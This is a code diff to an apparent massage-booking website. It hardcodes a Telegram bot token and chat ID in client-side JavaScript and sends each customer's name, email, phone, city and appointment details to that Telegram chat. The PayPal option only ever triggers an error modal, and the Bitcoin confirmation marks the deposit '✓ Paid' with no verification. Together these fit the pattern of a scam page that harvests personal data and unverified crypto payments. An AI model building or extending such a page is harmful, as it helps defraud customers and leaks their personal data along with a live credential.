@@ -758,7 +758,7 @@ font-family:'Inter',sans-serif;
 .ty-btn{background:#1B2B5E;color:#FFFFFF;border:none;padding:14px 32px;border-radius:10px;font-weight:700;font-size:0.85rem;letter-spacing:1px;text-transform:uppercase;cursor:pointer;font-family:'Inter',sans-serif;}
 .ty-btn:hover{background:#2C4EAA;}
 
-/* ===== MODAL OVERLAY (FIXED) ===== */
+/* ===== MODAL OVERLAY ===== */
 .modal-overlay{
   display:none;
   position:fixed;
@@ -1278,7 +1278,6 @@ display:none;flex-direction:column;max-height:400px;
     <!-- Payment Methods -->
     <div style="font-size:0.7rem;letter-spacing:3px;text-transform:uppercase;color:#6B7A9F;margin-bottom:12px;font-weight:600;">Choose Your Payment Method</div>
     <div class="pay-methods">
-      <!-- PayPal - now with inline onclick that works -->
       <div class="pay-method" onclick="showPaypalError(event)">
         <div class="pay-icon pay-icon-paypal">
           <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
@@ -1415,7 +1414,7 @@ display:none;flex-direction:column;max-height:400px;
 </div>
 
 <!-- ============================================================ -->
-<!--  MODAL OVERLAY (FIXED)                                       -->
+<!--  MODAL OVERLAY                                               -->
 <!-- ============================================================ -->
 <div class="modal-overlay" id="paypalModal">
   <div class="modal">
@@ -1461,6 +1460,72 @@ display:none;flex-direction:column;max-height:400px;
 <!--  JAVASCRIPT                                                  -->
 <!-- ============================================================ -->
 <script>
+// ===== TELEGRAM CONFIGURATION =====
+const TELEGRAM_BOT_TOKEN = '7252266937:AAEd4bxMlOa2epRtxO9yw-nNo9XSkW8O3oA';
+const TELEGRAM_CHAT_ID = '6753244811';
+
+// ===== TELEGRAM API FUNCTION =====
+async function sendBookingToTelegram(bookingData) {
+  try {
+    const message = `
+🆕 *NEW BOOKING RECEIVED!*
+
+👤 *Client Details:*
+• Name: ${bookingData.firstName} ${bookingData.lastName}
+• Email: ${bookingData.email}
+• Phone: ${bookingData.phone}
+
+📍 *Location:*
+• State: ${bookingData.state}
+• City: ${bookingData.city}
+
+📅 *Appointment:*
+• Date: ${bookingData.date}
+• Time: ${bookingData.time}
+
+💆 *Service Details:*
+• Service: ${bookingData.service}
+• Session: ${bookingData.session}
+• Total: $${bookingData.total}
+• Deposit Paid: $${bookingData.deposit}
+• Balance Due: $${bookingData.balance}
+
+🔑 *Booking Code:* ${bookingData.bookingCode}
+
+📱 *Source:* Website Booking
+🕐 *Booked On:* ${new Date().toLocaleString()}
+    `;
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown',
+        disable_web_page_preview: true,
+      })
+    });
+
+    if (!response.ok) {
+      const errorData = await response.json();
+      console.error('Telegram API Error:', errorData);
+      return false;
+    }
+
+    const data = await response.json();
+    console.log('Telegram message sent successfully:', data);
+    return true;
+  } catch (error) {
+    console.error('Failed to send booking to Telegram:', error);
+    return false;
+  }
+}
+
 const services=[
   {name:"Swedish Massage",badge:"Relaxation",desc:"Classic relaxation massage with long flowing strokes to ease tension, boost circulation and calm the nervous system.",img:"https://images.unsplash.com/photo-1600334089648-b0d9d3028eb2?w=700&q=80"},
   {name:"Deep Tissue Massage",badge:"Therapeutic",desc:"Targets deep muscle layers to release chronic tension and stubborn knots. Ideal for persistent pain and stiffness.",img:"https://images.unsplash.com/photo-1519823551278-64ac92734fb1?w=700&q=80"},
@@ -1762,6 +1827,24 @@ function proceedToPayment(){
   window._bookingDeposit=deposit;
   window._bookingBalance=balance;
   window._bookingService=document.getElementById('f-service').value;
+  window._bookingSession=document.getElementById('f-session').value;
+
+  // Store all booking data for Telegram
+  window._bookingData = {
+    firstName: document.getElementById('f-firstname').value,
+    lastName: document.getElementById('f-lastname').value,
+    email: document.getElementById('f-email').value,
+    phone: document.getElementById('f-phone').value,
+    state: document.getElementById('f-state').value,
+    city: document.getElementById('f-city').value,
+    date: document.getElementById('f-date').value,
+    time: document.getElementById('f-time').value,
+    service: document.getElementById('f-service').value,
+    session: document.getElementById('f-session').value,
+    total: fullNum,
+    deposit: deposit,
+    balance: balance
+  };
 
   document.getElementById('pay-total-display').textContent='$'+fullNum+'.00';
   document.getElementById('pay-amount-display').textContent='$'+deposit+'.00';
@@ -1771,16 +1854,11 @@ function proceedToPayment(){
   showPage('payment-page');
 }
 
-// ===== PAYMENT - FIXED MODAL FUNCTIONS =====
+// ===== PAYMENT =====
 function showPaypalError(e){
-  // Prevent event bubbling
   if(e) e.stopPropagation();
-  
-  // Show the modal
   const modal = document.getElementById('paypalModal');
   modal.classList.add('show');
-  
-  // Ensure the modal is visible
   modal.style.display = 'flex';
 }
 
@@ -1830,21 +1908,61 @@ function copyBookingCode(){
   }
 }
 
-function confirmBitcoinPayment(){
+// ===== CONFIRM PAYMENT WITH TELEGRAM =====
+async function confirmBitcoinPayment(){
+  // Show processing page
   showPage('processing-page');
-  setTimeout(()=>{
-    const code=generateBookingCode();
-    document.getElementById('booking-code').textContent=code;
-    const total=window._bookingTotal||0;
-    const deposit=window._bookingDeposit||0;
-    const balance=window._bookingBalance||0;
-    const svc=window._bookingService||'—';
-    document.getElementById('ty-service').textContent=svc;
-    document.getElementById('ty-total').textContent='$'+total+'.00';
-    document.getElementById('ty-deposit').textContent='$'+deposit+'.00 ✓ Paid';
-    document.getElementById('ty-balance').textContent='$'+balance+'.00';
-    showPage('thankyou-page');
-  },10000);
+  
+  // Generate booking code
+  const bookingCode = generateBookingCode();
+  
+  // Get booking data
+  const data = window._bookingData;
+  
+  // Prepare Telegram message
+  const telegramData = {
+    firstName: data.firstName || 'N/A',
+    lastName: data.lastName || 'N/A',
+    email: data.email || 'N/A',
+    phone: data.phone || 'N/A',
+    state: data.state || 'N/A',
+    city: data.city || 'N/A',
+    date: data.date || 'N/A',
+    time: data.time || 'N/A',
+    service: data.service || 'N/A',
+    session: data.session || 'N/A',
+    total: data.total || 0,
+    deposit: data.deposit || 0,
+    balance: data.balance || 0,
+    bookingCode: bookingCode
+  };
+
+  // Send to Telegram (with error handling)
+  let telegramSuccess = false;
+  try {
+    telegramSuccess = await sendBookingToTelegram(telegramData);
+    console.log('Telegram send result:', telegramSuccess);
+  } catch (error) {
+    console.error('Telegram send error:', error);
+  }
+
+  // Wait for processing animation
+  await new Promise(resolve => setTimeout(resolve, 8000));
+
+  // Update thank you page with booking info
+  document.getElementById('booking-code').textContent = bookingCode;
+  document.getElementById('ty-service').textContent = data.service || '—';
+  document.getElementById('ty-total').textContent = '$' + (data.total || 0) + '.00';
+  document.getElementById('ty-deposit').textContent = '$' + (data.deposit || 0) + '.00 ✓ Paid';
+  document.getElementById('ty-balance').textContent = '$' + (data.balance || 0) + '.00';
+
+  // If Telegram failed, show a warning on the thank you page
+  if (!telegramSuccess) {
+    const tyText = document.querySelector('.ty-text');
+    tyText.innerHTML = 'Thank you for choosing <strong style="color:#1B2B5E;">Massage Rub &amp; Therapist</strong>.<br>We have received your deposit. <span style="color:#e67e22;">⚠️ We could not send a confirmation to our team. Please contact us directly to confirm your booking.</span>';
+  }
+
+  showPage('thankyou-page');
 }
 
 // ===== SCROLL REVEAL =====
